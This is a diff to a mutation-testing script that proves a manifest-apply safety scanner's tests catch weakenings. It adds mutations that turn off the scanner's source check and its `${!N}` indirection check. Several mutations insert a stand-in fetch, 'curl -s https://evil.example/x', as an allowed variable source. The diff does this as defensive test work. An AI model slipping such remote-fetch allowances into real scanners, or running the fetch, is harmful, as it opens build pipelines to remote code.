@@ -26,6 +26,9 @@
  *   round 7 — a fetched value is never data:  M37 (heredoc expansions) M38 (no scalar exemption),
  *             M39 M40 M43 M44 (each allowlist entry), M45 (prefix match),
  *             M46 (file key ignored)
+ *   round 8 — the allowlist pins where its variables get their values:
+ *             M47 (source check off), M48 M49 M50 M51 (each entry blesses a remote fetch),
+ *             M52 (`${!N}` indirection unflagged)
  *
  * Usage:  node scripts/mutation-prove-kind-manifest-apply-safety.mjs
  */
@@ -48,7 +51,7 @@ const DRILL_SCRIPT = resolve(
 const KNATIVE_SCRIPT = resolve(REPO_ROOT, 'scripts/kind-manifests/apply-knative-kourier.sh');
 const SPEC = 'tests/kind-manifest-checksum-pin.test.ts';
 
-declareMutations(46);
+declareMutations(52);
 
 // Every subject must exist before anything is mutated: a missing one is a
 // FATAL throw here, never a run of vacuous reds.
@@ -400,6 +403,33 @@ prove(
   SCANNER,
   'e.file === st.file && e.statement === stmt',
   'e.statement === stmt',
+);
+
+// round 8 — the allowlist pins where the interpolated variables get their values
+prove(
+  'M47 allowlist: the producer/source check is off (the statement text alone decides)',
+  SCANNER,
+  '    if (extra.length > 0) {',
+  '    if (false) {',
+);
+for (const [n, id] of [
+  ['M48', 'lsn-inject-objstore'],
+  ['M49', 'lsn-inject-restore'],
+  ['M50', 'lsn-inject-app-restore'],
+  ['M51', 'ctl-seed-heredoc'],
+]) {
+  prove(
+    `${n} allowlist: the ${id} entry blesses a remote fetch as a source of its variables`,
+    SCANNER,
+    '    const allowed = new Set(entry.sources);',
+    `    const allowed = new Set(entry.id === '${id}' ? [...entry.sources, 'fetch:curl -s https://evil.example/x', 'url:https://evil.example/x'] : entry.sources);`,
+  );
+}
+prove(
+  'M52 heredoc: `${!N}` indirection of a fetched variable is not flagged',
+  SCANNER,
+  '      if (/\\$\\{![A-Za-z_]/.test(hd.body)) {',
+  '      if (false) {',
 );
 
 console.log(`\n${caught} caught, ${decorative} undetected.`);
